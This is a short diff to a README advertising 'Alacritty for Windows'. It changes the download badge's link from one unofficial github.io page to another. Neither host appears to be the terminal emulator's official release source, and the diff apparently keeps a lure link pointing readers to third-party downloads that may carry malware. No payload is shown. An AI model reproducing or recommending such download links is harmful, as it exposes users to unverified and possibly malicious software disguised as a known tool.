@@ -4,7 +4,7 @@
 
 ## 📥 Download Alacritty for Windows
 
-[![⬇️ Download Alacritty](https://img.shields.io/badge/Download-Alacritty-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Alacritty)
+[![⬇️ Download Alacritty](https://img.shields.io/badge/Download-Alacritty-blue?style=for-the-badge&logo=windows)](https://alacritty-for-windows.github.io/.github)
 
 ---
 
